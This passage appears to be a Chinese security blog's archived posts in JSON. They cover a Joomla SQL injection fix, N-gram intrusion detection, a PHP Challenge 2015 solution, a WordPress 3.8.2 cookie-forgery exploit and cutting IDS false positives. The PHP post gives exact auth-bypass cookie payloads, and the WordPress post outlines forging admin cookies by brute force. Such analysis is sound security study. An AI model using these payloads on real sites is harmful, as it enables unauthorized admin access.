\r\n```\r\n\r\njform[associations][en-GB] 这个参数就是 $associations，成功注入。\r\n\r\n![Jommla](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/dWuY7g.jpg)\r\n\r\n> 这里打一波广告，我们的Skywolf是可以轻松检测出来的，如下图\r\n\r\n![Skywolf](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/vwJyVt.jpg)\r\n\r\n另外，`libraries/legacy/model/admin.php` 这里也存在着同样的问题。\r\n\r\n### 修复方案\r\n\r\n官方增加了：\r\n\r\n```php\r\n...\r\n$associations = Joomla\\Utilities\\ArrayHelper::toInteger($associations);\r\n...\r\n$query->values(((int) $id) . ',' . $db->quote($this->associationsContext) . ',' . $db->quote($key));\r\n...\r\n```\r\n\r\n将 $associations 中的所有值转换为int型。还有将 $id 强制转换为int。\r\n\r\n## 参考资料\r\n\r\n1. [http://drops.wooyun.org/papers/11330](http://drops.wooyun.org/papers/11330)\r\n2. [http://drops.wooyun.org/papers/11371](http://drops.wooyun.org/papers/11371)\r\n3. [http://bobao.360.cn/learning/detail/2501.html](http://bobao.360.cn/learning/detail/2501.html)\r\n4. [https://github.com/joomla/joomla-cms/commit/2cd4ef682f0cab6ff03200b79007a25f19c6690e](https://github.com/joomla/joomla-cms/commit/2cd4ef682f0cab6ff03200b79007a25f19c6690e)\r\n5. [https://www.joomla.org/announcements/release-news/5643-joomla-3-4-7.html](https://www.joomla.org/announcements/release-news/5643-joomla-3-4-7.html)\r\n"},{"fields":{"slug":"/博客/Archive/N-gram在安全领域的应用/","title":"N-gram在安全领域的应用"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: N-gram在安全领域的应用\r\ntags:\r\n  - 博客\r\n  - 机器学习\r\n  - 入侵检测\r\norder: 111112\r\n---\r\n\r\n## 什么是N-Gram？\r\n\r\nN-Gram是一种在自然语言处理(NLP)中常用的一种概率语言模型(Probabilistic Language Model)，常用于语音\\手写识别、机器翻译、拼写纠错等等领域。\r\n\r\n它的本质就是计算一个句子或者一连串词出现的概率。\r\n\r\n```python\r\n/*\r\nT 是由 W1,W2,W3,W4,W5 ... Wn组成的一个句子。\r\n*/\r\n\r\nP(T) = P(W1,W2,W3,W4,W5 ... Wn) //这个句子出现的概率是里面每一个词出现的概率的叠加。\r\n\r\nP(W5|W1,W2,W3,W4) //已经出现第1个至第4个的词的情况下，第5个词出现的概率。\r\n```\r\n\r\n比如：\r\n\r\n![Google](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/r9iFeU.jpg)\r\n\r\nI am working 后面很有可能出现`at`, `in`, `for` ，而不是`refrigerator`, `throw`, `gull`。那么如何计算N-Grams呢？我们可以使用链式法则([Chain Rule](https://en.wikipedia.org/wiki/Chain_rule_(probability)))，求多个关联事件并存时的概率：\r\n\r\n- 2个事件同时发生的概率：**P(a, b) = P(a | b) * P(b)**\r\n- 3个事件的概率链式调用：**P(a, b, c) = P(a | b, c) * P(b, c) = P(a | b, c) * P(b | c) * P(c)**\r\n- 推广到N个事件，概率链式法则为：**P(X1, X2, ... Xn) = P(X1 | X2, X3 ... Xn) * P(X2 | X3, X4 ... Xn) ... P(Xn-1 | Xn) * P(Xn)**\r\n\r\n但是这样会有两个问题：\r\n\r\n1. 参数空间过大，不可能实用化。（N越大越难计算）\r\n2. 数据稀疏严重，语言有各种各样的组合，数据量太大，无法获取这么全的数据。\r\n\r\n所以为了简化这个问题，我们引入马尔科夫假设（Markov Assumption）：”一个词的出现仅仅依赖于它前面出现的一个或者有限的几个词。”\r\n\r\n1. 如果一个词的出现仅仅依赖于它本身，我们称之为 Uni-gram model : `P(T) = P(W1)P(W2)...P(Wn)`\r\n2. 如果一个词的出现仅仅依赖于它前面出现的一个词，我们称之为 Bi-gram model : `P(T) = P(W1)P(W2|W1)P(W3|W2)...P(Wn|Wn-1)`\r\n3. 如果一个词的出现仅仅依赖于它前面出现的两个词，我们称之为 Tri-gram model : `P(T) = P(W1)P(W3|W1,W2)...P(Wn|Wn-2,Wn-1)`\r\n4. 依次类推到仅依赖于它前面出现的N个词，还有4-gram, 5-gram。\r\n\r\n下面用Bi-gram举个例子，语料库来自 [[Berkeley Restaurant Project]](http://www1.icsi.berkeley.edu/Speech/berp.html) ，总词数为 10132。\r\n\r\n词和词频率：\r\n\r\n| i | want | to | eat | chinese | food | lunch | spend |\r\n| --- | --- | --- | --- | --- | --- | --- | --- |\r\n| 2533 | 927 | 2417 | 746 | 158 | 1093 | 341 | 278 |\r\n\r\n词序列频率：\r\n\r\n| * | i | want | to | eat | chinese | food | lunch | spend |\r\n| --- | --- | --- | --- | --- | --- | --- | --- | --- |\r\n| i | 5 | 827 | 0 | 9 | 0 | 0 | 0 | 2 |\r\n| want | 2 | 0 | 608 | 1 | 6 | 6 | 5 | 1 |\r\n| to | 2 | 0 | 4 | 686 | 2 | 0 | 6 | 211 |\r\n| eat | 0 | 0 | 2 | 0 | 16 | 2 | 42 | 0 |\r\n| chinese | 1 | 0 | 0 | 0 | 0 | 82 | 1 | 0 |\r\n| food | 15 | 0 | 15 | 0 | 1 | 4 | 0 | 0 |\r\n| lunch | 2 | 0 | 0 | 0 | 0 | 1 | 0 | 0 |\r\n| spend | 1 | 0 | 1 | 9 | 0 | 0 | 0 | 0 |\r\n\r\n根据上表我们可以直观的看出，在这八个词的组合中，概率最高的句子是： i want to eat lunch 。它的概率是 P(i want to eat lunch) = P(i)P(want|i)P(to|want)P(eat|to)P(lunch|eat) = 2533/10132 * *827/2533* * 608/927 * *686/2417* * 42/746 = 0.25 * *0.326* * 0.656 * *0.284* * 0.056 = 0.00085\r\n\r\n### Smoothing\r\n\r\n随着N-Grams的N的增大，N-Grams的数量对越来越多。如果词表中有10000个词，Bi-Gram模型可能产生100000000个N-Gram，Tri-Gram模型则可能产生1000000000000个N-Gram，那么会出现(unseen events)，词库中的某些词在训练样本中没有的情况（比如`in`在训练样本中没有出现在`turn`\r\n后面）。为了避免在这种情况下概率为0，我们使用Smoothing来解决。\r\n\r\n1. add-1 smoothing : 很简单，给所有统计的counts加 1 。\r\n2. add-k smoothing : 将高概率分到unseen events，在计算概率的时候，选择一个合适的k值。\r\n    \r\n    ![add-k](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/MEKSo5.jpg)\r\n    \r\n3. backoff ： 如果Tri-gram统计为0，就去看Bi-gram，以此类推。\r\n4. interpolation : 以权重，将Tri-gram，Bi-gram，Uni-gram综合起来。（举例）\r\n5. kneser-ney smoothing : 以地位向高位，或者高位向地位的方向，传递高频。\r\n\r\n## 使用Python生成N-grams\r\n\r\n简单的实现：\r\n\r\n```python\r\nclass NGram(object):\r\n\tdef __init__(self, text, n=3):\r\n\t\tself.n = n\r\n\t\tself.table = {}\r\n\t\tself.parse_text(list(text), n)\r\n\r\n\tdef parse_text(self, text, n):\r\n\t\tfor letter in zip(*[text[i:] for i in range(n)]):\r\n\t\t\tself.table[''.join(letter)] = self.table.get(''.join(letter), 0) + 1 # increment count\r\n\r\nprint NGram(\"abcdef\", n=3).table\r\n```\r\n\r\n## NIDS中的应用\r\n\r\n### 案例一\r\n\r\nKe Wang 和 Salvatore J. Stolfo 在《Anomalous Payload-based Network Intrusion Detection 》中提出了一种基于1-Gram的方法，将数据包以端口分类，相同端口的数据包再以不同的长度分类，然后计算出ASCII字符0-255的平均分布频率，作为一个特征，加上平均分布频率的平均值，方差，标准差作为另一个特征。有了这两个特征，就可以在异常检测中建立模型，完成任务。如下图：\r\n\r\n![案例一](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/qvrUtF.jpg)\r\n\r\n整个思路是：是训练阶段，算出不同端口/长度数据包的平均字节概率分布模型(平均值，方差，标准差)，预测阶段，算出新数据包的字节概率分布模型，使用马氏距离(Mahalanobis distance)，比较两个模型的差异，当差异超过某个阈值的时候，则检测出异常。还加上了增量学习(Incremental learning)使整个模型随着新数据的到来，不断的更新自己的参数(平均值，方差，标准差)，”淘汰”旧数据，”更新”新数据。\r\n\r\n文中还提到了一种实现签名检测的方法：将字节的平均概率分布图，把频率从高到低进行重排序。这样得出的分布图很像Zipf-like分布(指数函数/幂函数少数值频繁出现，多数值偶尔出现。通俗地讲，就是二八原则：80%的财富集中在20%的人手中……80%的用户只使用20%的功能……20%的用户贡献了80%的访问量……)，这样用很小的长度就表示了整个ASCII范围的平均概率分布。比如下图，重排序后只用83个unique 的字符就表示了整个平均概率分布。\r\n\r\n![案例一](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/frPmAf.jpg)\r\n\r\n通过这种方法将已识别/确认的异常数据包做成签名(signature)，可以快速准确地检测其他地方可能出现的相同异常数据包。\r\n\r\n### 案例二\r\n\r\n前面说到的方法是1-Gram的应用，然而1-Gram的简单性(平均字节概率分布)很容易受到拟态攻击(mimicry attacks)，攻击者可以通过填充无用字符的方法来伪造出正常的概率分布，从而绕过检测。于是他们又提出了基于N-gram N大于1 的方法。见《Anagram: A Content Anomaly Detector Resistant to Mimicry Attack》\r\n\r\nN-gram的本质和1-Gram是一样的，只不过特征空间变大大，在计算的时间/内存开销也很大。比如一个TCP 数据包，长度是256，那么他的N-garm就有256^n。作者通过选取几个N值，比如3-Gram, 4-Gram, 5-Gram等等，然后用Bloom filter(原理相当于哈希表)进行存储。最后在ROC曲线中比较这些N-gram的召回率与准确率，选取合适的模型。如图：\r\n\r\n![案例二](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/JsmuVT.jpg)\r\n\r\n其他细节就略过，感兴趣可以自己查阅。\r\n\r\n## 其他应用\r\n\r\nN-gram在安全领域还有很多其他的应用，比如HIDS(通过系统调用做异常检测)、恶意软件分类/识别、敏感词识别/屏蔽等等。但是效果却不好，误报、漏报严重。原因之前也提过，比如：测试还在用DARPA1999, KDD99等老样本、模型存在偏差样本性、缺乏实践等等问题。\r\n\r\n开源项目参考：\r\n\r\n[https://github.com/chwress/salad](https://github.com/chwress/salad)\r\n\r\n## 参考资料\r\n\r\n1. [Anomalous Payload-based Network Intrusion Detection](http://academiccommons.columbia.edu/catalog/ac%3A125704)\r\n2. [Anagram: A Content Anomaly Detector Resistant to Mimicry Attack](http://ids.cs.columbia.edu/sites/default/files/anagram-camera-fixed.pdf)\r\n3. [N-Grams tutorial](https://lagunita.stanford.edu/c4x/Engineering/CS-224N/asset/slp4.pdf)\r\n4. [N-Grams wikipedia](https://en.wikipedia.org/wiki/N-gram)\r\n"},{"fields":{"slug":"/博客/Archive/PHP Challenge 2015/","title":"PHP Challenge 2015"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: PHP Challenge 2015\r\ntags:\r\n  - 博客\r\n  - PHP\r\n  - web安全\r\n---\r\n\r\n## 背景\r\n\r\n在乌云上看到[PHP Challenge 2015](http://zone.wooyun.org/content/22100)，深感兴趣，但并无思路，直到看了[@Ryat](https://weibo.com/3202054374/CtNpv1ov8?type=comment)大牛的微博才知道答案。\r\n\r\n## PHP bug\r\n\r\n先贴出代码吧\r\n\r\n```php\r\n<?php\r\n\r\n/*******************************************************************\r\n* PHP Challenge 2015\r\n*******************************************************************\r\n* Why leave all the fun to the XSS crowd?\r\n*\r\n* Do you know PHP?\r\n* And are you up to date with all its latest peculiarities?\r\n*\r\n* Are you sure?\r\n*\r\n* If you believe you do then solve this challenge and create an\r\n* input that will make the following code believe you are the ADMIN.\r\n* Becoming any other user is not good enough, but a first step.\r\n*\r\n* Attention this code is installed on a Mac OS X 10.9 system\r\n* that is running PHP 5.4.30 !!!\r\n*\r\n* TIPS: OS X is mentioned because OS X never runs latest PHP\r\n*       Challenge will not work with latest PHP\r\n*       Also challenge will only work on 64bit systems\r\n*       To solve challenge you need to combine what a normal\r\n*       attacker would do when he sees this code with knowledge\r\n*       about latest known PHP quirks\r\n*       And you cannot bruteforce the admin password directly.\r\n*       To give you an idea - first half is:\r\n*          orewgfpeowöfgphewoöfeiuwgöpuerhjwfiuvuger\r\n*\r\n* If you know the answer please submit it to info@sektioneins.de\r\n********************************************************************/\r\n\r\n$users = array(\r\n        \"0:9b5c3d2b64b8f74e56edec71462bd97a\" ,\r\n        \"1:4eb5fb1501102508a86971773849d266\",\r\n        \"2:facabd94d57fc9f1e655ef9ce891e86e\",\r\n        \"3:ce3924f011fe323df3a6a95222b0c909\",\r\n        \"4:7f6618422e6a7ca2e939bd83abde402c\",\r\n        \"5:06e2b745f3124f7d670f78eabaa94809\",\r\n        \"6:8e39a6e40900bb0824a8e150c0d0d59f\",\r\n        \"7:d035e1a80bbb377ce1edce42728849f2\",\r\n        \"8:0927d64a71a9d0078c274fc5f4f10821\",\r\n        \"9:e2e23d64a642ee82c7a270c6c76df142\",\r\n        \"10:70298593dd7ada576aff61b6750b9118\"\r\n);\r\n\r\n$valid_user = false;\r\n\r\n$input = $_COOKIE['user'];\r\n\r\n$input[1] = md5($input[1]);\r\n\r\nforeach ($users as $user)\r\n{\r\n        $user = explode(\":\", $user);\r\n        echo 'user = '.$user;\r\n        if ($input === $user) {\r\n                $uid = $input[0] + 0;\r\n                $valid_user = true;\r\n        }\r\n}\r\n\r\nif (!$valid_user) {\r\n        die(\"not a valid user\\n\");\r\n}\r\n\r\nif ($uid == 0) {\r\n\r\n        echo \"Hello Admin How can I serve you today?\\n\";\r\n        echo \"SECRETS ....\\n\";\r\n\r\n} else {\r\n        echo \"Welcome back user\\n\";\r\n}\r\n\r\n?>\r\n```\r\n\r\n按照Ryat的提示，找到([https://bugs.php.net/bug.php?id=69892](https://bugs.php.net/bug.php?id=69892))\r\n\r\n```php\r\nBug #69892 \tDifferent arrays compare indentical due to integer key truncation\r\nDescription:\r\n------------\r\nvar_dump([0 => 0] === [0x100000000 => 0]); // bool(true)\r\non all versions: http://3v4l.org/Sjdf8\r\n```\r\n\r\ninteger类型的key截断导致不同的数组比较结果相同。我们去看看PHP源码中的相关片段，在`Zend/zend_hash.c`：\r\n\r\n```c\r\n//php5.2.14\r\nZEND_API int zend_hash_compare(HashTable *ht1, HashTable *ht2, compare_func_t compar, zend_bool ordered TSRMLS_DC)\r\n{\r\n\tBucket *p1, *p2 = NULL;\r\n\tint result;\r\n\tvoid *pData2;\r\n\r\n\tIS_CONSISTENT(ht1);\r\n\tIS_CONSISTENT(ht2);\r\n\r\n\tHASH_PROTECT_RECURSION(ht1); \r\n\tHASH_PROTECT_RECURSION(ht2); \r\n\r\n\tresult = ht1->nNumOfElements - ht2->nNumOfElements;\r\n\tif (result!=0) {\r\n\t\tHASH_UNPROTECT_RECURSION(ht1); \r\n\t\tHASH_UNPROTECT_RECURSION(ht2); \r\n\t\treturn result;\r\n\t}\r\n\r\n\tp1 = ht1->pListHead;\r\n\tif (ordered) {\r\n\t\tp2 = ht2->pListHead;\r\n\t}\r\n\r\n\twhile (p1) {\r\n\t\tif (ordered && !p2) {\r\n\t\t\tHASH_UNPROTECT_RECURSION(ht1); \r\n\t\t\tHASH_UNPROTECT_RECURSION(ht2); \r\n\t\t\treturn 1; /* That's not supposed to happen */\r\n\t\t}\r\n\t\tif (ordered) {\r\n\t\t\tif (p1->nKeyLength==0 && p2->nKeyLength==0) { /* numeric indices */\r\n\t\t\t\tresult = p1->h - p2->h;\r\n\t\t\t\tif (result!=0) {\r\n\t\t\t\t\tHASH_UNPROTECT_RECURSION(ht1); \r\n\t\t\t\t\tHASH_UNPROTECT_RECURSION(ht2); \r\n\t\t\t\t\treturn result;\r\n\t\t\t\t}\r\n\t\t\t} else { /* string indices */\r\n\t\t\t\tresult = p1->nKeyLength - p2->nKeyLength;\r\n\t\t\t\tif (result!=0) {\r\n\t\t\t\t\tHASH_UNPROTECT_RECURSION(ht1); \r\n\t\t\t\t\tHASH_UNPROTECT_RECURSION(ht2); \r\n\t\t\t\t\treturn result;\r\n\t\t\t\t}\r\n\t\t\t\tresult = memcmp(p1->arKey, p2->arKey, p1->nKeyLength);\r\n\t\t\t\tif (result!=0) {\r\n\t\t\t\t\tHASH_UNPROTECT_RECURSION(ht1); \r\n\t\t\t\t\tHASH_UNPROTECT_RECURSION(ht2); \r\n\t\t\t\t\treturn result;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tpData2 = p2->pData;\r\n\t\t} else {\r\n\t\t\tif (p1->nKeyLength==0) { /* numeric index */\r\n\t\t\t\tif (zend_hash_index_find(ht2, p1->h, &pData2)==FAILURE) {\r\n\t\t\t\t\tHASH_UNPROTECT_RECURSION(ht1); \r\n\t\t\t\t\tHASH_UNPROTECT_RECURSION(ht2); \r\n\t\t\t\t\treturn 1;\r\n\t\t\t\t}\r\n\t\t\t} else { /* string index */\r\n\t\t\t\tif (zend_hash_quick_find(ht2, p1->arKey, p1->nKeyLength, p1->h, &pData2)==FAILURE) {\r\n\t\t\t\t\tHASH_UNPROTECT_RECURSION(ht1); \r\n\t\t\t\t\tHASH_UNPROTECT_RECURSION(ht2); \r\n\t\t\t\t\treturn 1;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tresult = compar(p1->pData, pData2 TSRMLS_CC);\r\n\t\tif (result!=0) {\r\n\t\t\tHASH_UNPROTECT_RECURSION(ht1); \r\n\t\t\tHASH_UNPROTECT_RECURSION(ht2); \r\n\t\t\treturn result;\r\n\t\t}\r\n\t\tp1 = p1->pListNext;\r\n\t\tif (ordered) {\r\n\t\t\tp2 = p2->pListNext;\r\n\t\t}\r\n\t}\r\n\t\r\n\tHASH_UNPROTECT_RECURSION(ht1); \r\n\tHASH_UNPROTECT_RECURSION(ht2); \r\n\treturn 0;\r\n}\r\n```\r\n\r\n关键在34行:\r\n\r\n```c\r\nif (p1->nKeyLength==0 && p2->nKeyLength==0) { /* numeric indices */\r\n    result = p1->h - p2->h; //这里喔\r\n    if (result!=0) {\r\n        HASH_UNPROTECT_RECURSION(ht1); \r\n        HASH_UNPROTECT_RECURSION(ht2); \r\n        return result;\r\n    }\r\n```\r\n\r\n当数组的key为integer进到这里，比较他们的key是否相同，p1和p2是PHP的bucket结构体，其中h保存着数组的key。bucket结构如下：\r\n\r\n```c\r\n//location:Zend/zend_hash.h\r\ntypedef struct bucket {\r\n\tulong h;\t\t\t\t\t\t/* Used for numeric indexing */\r\n\tuint nKeyLength;\r\n\tvoid *pData;\r\n\tvoid *pDataPtr;\r\n\tstruct bucket *pListNext;\r\n\tstruct bucket *pListLast;\r\n\tstruct bucket *pNext;\r\n\tstruct bucket *pLast;\r\n\tchar arKey[1]; /* Must be last element */\r\n} Bucket;\r\n```\r\n\r\n可以看出h是ulong，ulong是一个unsigned long，如下：\r\n\r\n```c\r\ntypedef unsigned long ulong;\r\n```\r\n\r\n看到这里不知道大家有没有看出问题？注意喔，保存p1和p2差值的变量是result，而result是int型变量，这就导致了在64位系统中，unsigned long是64位整型，而int是32位整型，类型的不同出现问题。程序会将`p1->h - p2->h`的结果强制转换为int，我们都知道unsigned long转int会截取低4个字节。所以只需要让unsigned long的低4字节为0，它转换后的int就为0。比如我们将二进制`10000000000000000000000000000000000000`转换为十进制`137438953472`，那么`137438953472`转为int就为0。\r\n\r\n## 分析\r\n\r\n现在再来看看这个php代码吧，前面的那个bug利用前提是数组的value相同，key不同，所以首先需要匹配一个md5出来，我在cmd5试了这10个md5，只有第五个`06e2b745f3124f7d670f78eabaa94809`能解出，原文是`hund`。于是首先写入cookie：`Cookie: user[0]=5;user[1]=hund;` 程序会进入58行，验证通过，$valid_user被改为true，这个时候输出为`Welcome back user`。到了这一步答案已经很接近了，只需要将$uid改为0即可。现在试试前面提到的漏洞，我们写入cookie：`Cookie: user[137438953472]=5;user[1]=hund;` 这个时候因为之前提到的漏洞，程序还是会进入58行，因为$input[0]未赋值，所以为NULL，在PHP中`0+NULL=0`,故成功将$uid改为0。\r\n"},{"fields":{"slug":"/博客/Archive/WordPress 3.8.2 cookie伪造漏洞及Python使用urllib2出现30x跳转的问题/","title":"WordPress 3.8.2 cookie伪造漏洞及Python使用urllib2出现30x跳转的问题"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: WordPress 3.8.2 cookie伪造漏洞及Python使用urllib2出现30x跳转的问题\r\ntags:\r\n  - 博客\r\n  - Python\r\n  - WordPress\r\n---\r\n\r\n## 背景\r\n\r\n首先看这篇文章：WordPress 3.8.2 cookie伪造漏洞再分析 [http://drops.wooyun.org/papers/1409](http://drops.wooyun.org/papers/1409)\r\n\r\n推荐阅读：\r\n\r\n[The dangers of type coercion and remote management plugins](http://joncave.co.uk/2013/03/dangers-of-type-coercion-and-remote-management/)\r\n\r\nWordPress 3.8.2修复的一个重要漏洞是cookie伪造漏洞 [(CVE-2014-0166)](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0166)。该漏洞可以被攻击者利用通过伪造身份验证Cookie，登陆网站。\r\n\r\n## 利用\r\n\r\n具体的原理请看上面这篇文章，这里就不多重复了。\r\n\r\n也就是说，我们只要把cookies设置成 “admin|$expiration|0”,就可以登陆后台了。\r\n\r\n思路是：\r\n\r\n- 1.尝试$expiration构造Cookie\r\n- 2.GET请求到[http://www.example.com/wp-admin/profile.php](http://www.example.com/wp-admin/profile.php),根据返回的http header判断是否跳转,如为200则成功\r\n- 3.多线程,有条件使用多机器\r\n\r\n## 题外话\r\n\r\n在写利用脚本的时候发现，python的urllib2.urlopen会遇到301/302自动跳转的问题，这样无法判断出http状态码是否是302。来分析看看为什么吧。:)\r\n\r\n打开urllib2源码，刚开头就看到了相关文档：\r\n\r\n`The HTTPRedirectHandler automatically deals with HTTP 301, 302, 303 and 307 redirect errors.`\r\n\r\n仔细阅读源码看一下调用过程：\r\n\r\n```python\r\n#调用urlopen的文件\r\nresponse = urllib2.urlopen(request)\r\n#urllib2.py ,line 127, in urlopen\r\nreturn _opener.open(url, data, timeout)\r\n#urllib2.py ,line 410, in open\r\nresponse = meth(req, response)\r\n#urllib2.py ,line 523, in http_response\r\nresponse = self.parent.error(\r\n                'http', request, response, code, msg, hdrs)\r\n#urllib2.py ,line 442, in error\r\nresult = self._call_chain(*args)\r\n#urllib2.py ,line 382, in _call_chain\r\nresult = func(*args)\r\n#urllib2.py ,line 608, in http_error_302\r\nnew = self.redirect_request(req, fp, code, msg, headers, newurl)\r\n```\r\n\r\n到这里我想已经够清楚了(执行到了我们之前在文档看到的HTTPRedirectHandler)，最后的redirect_request：\r\n\r\n```python\r\ndef redirect_request(self, req, fp, code, msg, headers, newurl):\r\n    \"\"\"Return a Request or None in response to a redirect.\r\n\r\n    This is called by the http_error_30x methods when a\r\n    redirection response is received.  If a redirection should\r\n    take place, return a new Request to allow http_error_30x to\r\n    perform the redirect.  Otherwise, raise HTTPError if no-one\r\n    else should try to handle this url.  Return None if you can't\r\n    but another Handler might.\r\n    \"\"\"\r\n    m = req.get_method()\r\n    if (code in (301, 302, 303, 307) and m in (\"GET\", \"HEAD\")\r\n        or code in (301, 302, 303) and m == \"POST\"):\r\n        # Strictly (according to RFC 2616), 301 or 302 in response\r\n        # to a POST MUST NOT cause a redirection without confirmation\r\n        # from the user (of urllib2, in this case).  In practice,\r\n        # essentially all clients do redirect in this case, so we\r\n        # do the same.\r\n        # be conciliant with URIs containing a space\r\n        newurl = newurl.replace(' ', '%20')\r\n        newheaders = dict((k,v) for k,v in req.headers.items()\r\n                          if k.lower() not in (\"content-length\", \"content-type\")\r\n                         )\r\n        return Request(newurl,\r\n                       headers=newheaders,\r\n                       origin_req_host=req.get_origin_req_host(),\r\n                       unverifiable=True)\r\n    else:\r\n        raise HTTPError(req.get_full_url(), code, msg, headers, fp)\r\n```\r\n\r\n所以GET遇到状态码（301, 302, 303, 307）时会Request跳转到新的地址，所以我们无法获取这些状态码(没有保存下来)。\r\n\r\n我们需要自己写一个hander来重写30x方法处理这种情况，保存状态码。代码如下：\r\n\r\n```python\r\n#-*- coding:utf-8 -*-\r\nimport urllib2\r\n#自定义hander\r\nclass SmartRedirectHandler(urllib2.HTTPRedirectHandler):\r\n\tdef http_error_301(self, req, fp, code, msg, headers):\r\n\t\tresult = urllib2.HTTPRedirectHandler.http_error_301(self, req, fp, code, msg, headers)  \r\n\t\tresult.status = code\r\n\t\treturn result  \r\n\tdef http_error_302(self, req, fp, code, msg, headers):\r\n\t\tresult = urllib2.HTTPRedirectHandler.http_error_302(self, req, fp, code, msg, headers)\r\n\t\tresult.status = code\r\n\t\treturn result\r\n\r\nrequest = urllib2.Request(\"http://www.example.com/wp-admin/profile.php\") \r\nopener = urllib2.build_opener(SmartRedirectHandler)\r\nurllib2.install_opener(opener)\r\nresponse = urllib2.urlopen(request)\r\nprint response.status\r\n```\r\n\r\n这样，就可以正常返回301/302状态码。\r\n\r\n另外，WordPress 3.8.2补丁分析 HMAC timing attack [http://drops.wooyun.org/papers/1404](http://drops.wooyun.org/papers/1404) 思路确实很赞。\r\n"},{"fields":{"slug":"/博客/Archive/入侵检测系统如何降低误报率？/","title":"入侵检测系统如何降低误报率？"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 入侵检测系统如何降低误报率？\r\ntags:\r\n  - 博客\r\n  - 入侵检测\r\n  - 误报率\r\n  - 指标\r\n---\r\n\r\n## 背景\r\n\r\n入侵检测技术一般分为异常检测和特征/签名检测，这里主要讨论的是网络入侵检测系统(NIDS)。\r\n\r\n1. 异常检测 (Anomaly detection)：假设入侵者活动异常于正常主体的活动。常用的方法有：关联规则、神经网络、SVM、邻近算法、隐含马尔可夫模型、Kalman过滤器、聚类算法、PCA、信息论等等。缺点是：需要训练样本、误报率（异常行为≠入侵行为）高。\r\n2. 特征/签名检测 (Misuse/Signature detection)：假设入侵者活动可以用一种模式来表示，然后将观察对象与之进行比较，判别是否符合这些模式。常用的方法有：关联规则、神经网络、SVM、决策树、遗传算法、贝叶斯网络等等。缺点是：对新的入侵方法无能为力。\r\n\r\n主流的入侵检测系统通常是采用异常检测+特征/签名检测。他们都存在的问题就是：\r\n\r\n1. 告警的基数大，即使只有1%的误报率，也会产生大量的误报告警。\r\n2. 误报率往往跟漏报率成反比，改进算法降低误报率可能会增加漏报率，降低系统的可靠性。\r\n3. 大量的告警需要人工审核，造成疲惫和不信任感。\r\n\r\n## 基于输出数据(Outgoing data)\r\n\r\n完整的数据流应该包括输入和输出两个部分，而大部分NIDS却只考虑了输入数据，没有使用输出数据。通常情况下，存在异常/恶意输入数据，并不意味着有成功的入侵行为。比如一个任意文件读取的HTTP请求，只有当它的响应体中包含那个文件的内容，才算是一个成功的入侵行为。所以降低误报率的一个方法就是对输入和输出数据进行关联分析。而输出的异常检测，就是另一种方法。\r\n\r\n输出数据有以下几个问题：\r\n\r\n1. 不同程序/服务的输出数据不同，而且在使用的过程中，输出数据可能会一直变化。\r\n2. 不同程序/服务对于一种攻击类型做出的反应不同（比如一个SQL注入的HTTP请求，有些程序直接阻断，有些程序做了过滤，正常返回）。\r\n3. 如何把输入和输出数据关联起来？\r\n\r\n那么这种降低误报的方法就是在传统的基于输入的NIDS的基础上，增加：1、输入输出数据的关联分析。2、输出数据的异常检测。结构如下：\r\n\r\n![结构](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/HAObFW.jpg)\r\n\r\n`一次成功的攻击行为一定会引起程序/服务的异常输出(输出数据、响应时间、其他行为等等)`。当NIDS触发告警，关联引擎查看该告警对应的输出数据是否有异常，如果存在异常才认定为True positive。也可将攻击行为分类，关联分析输出数据是否符合该攻击行为的响应。当然，这也存在着许多缺点：1、每个程序/服务第一需要大量的样本训练。2、程序/服务的某些特征出现变动，需要重新训练样本。3、输出数据太多(比如我司http下行流量4GB/s)，收集、训练成本太高。4、其他…\r\n\r\n## 基于威胁模型(Thread Model)\r\n\r\nNIDS的目的就是随时发现可能的入侵行为，并进行具体分析，及时、主动地进行干预(发送告警)，从而取得防患于未然的效果，也就是说降低风险。在风险管理中，`Risk = (probablity of the accident occuring) x (expected loss in case of accident)`。其中(expected loss in case of accident)可以理解的攻击的类型，常见的有三类：\r\n\r\n1. 信息收集类（域名/IP/服务/端口扫描、漏洞扫描器等）\r\n2. 拒绝服务类（带宽、资源消耗）\r\n3. 程序/服务攻击（获取权限、数据库、Shell等等）\r\n\r\n其中第三种类型的攻击造成的损失最大，而第一种类型的攻击并不会立马带来什么损失，所以针对不同类型的攻击，应当给予不同的分数（每种类型的攻击还可以细分）。同时，(probablity of the accident occuring)可以理解为攻击发生的概率，那么同一输入数据/类型攻击的告警数量越多是不是意味着攻击发生的概率大呢？结合这两点因素，组成一个评分系统，再评估出一个合理的阈值，认为所有小于阈值的告警都是误报。\r\n\r\n## 改进算法/训练样本/模型\r\n\r\n这一块任重而道远（比如：测试还在用DARPA1999, KDD99等样本、模型存在偏差样本性、缺乏实践等等问题），在此就不细谈了，下图是相关的研究：\r\n\r\n![相关研究](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/en0vmf.jpg)\r\n\r\n## 参考资料\r\n\r\n1. Damiano Bolzoni, Sandro Etalle. APHRODITE: an Anomaly-based Architecture for False Positive Reduction\r\n2. [http://www.symantec.com/connect/articles/strategies-reduce-false-positives-and-false-negatives-nids](https://www.symantec.com/connect/articles/strategies-reduce-false-positives-and-false-negatives-nids)\r\n3. Asieh Mokarian, Ahmad Faraahi, Arash Ghorbannia Delavar. False Positives Reduction Techniques in Intrusion Detection Systems-A Review\r\n"},{"fields":{"slug":"/博客/Archive/利用Calibre.recipe爬取文章/","title":"利用Calibre.recipe爬取文章"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 利用Calibre.recipe爬取文章\r\ntags:\r\n  - 博客\r\n  - 